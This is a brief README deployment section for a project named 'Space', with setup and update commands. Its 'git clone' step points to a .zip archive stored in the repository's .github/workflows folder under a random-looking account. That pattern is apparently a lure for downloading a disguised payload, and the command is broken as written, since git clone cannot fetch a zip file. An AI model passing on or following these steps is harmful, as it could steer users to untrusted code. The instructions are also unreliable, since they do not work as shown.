## Deployment

> [!WARNING]
> You **can not** host Space locally via a static web hosting site
> such as Netlify, Github Pages, and Cloudflare Pages.

Please run the following commands to host a server:

```
git clone https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip
cd Space
pnpm i
pnpm start
```

### Updating

```
git pull --force --allow-unrelated-histories
```
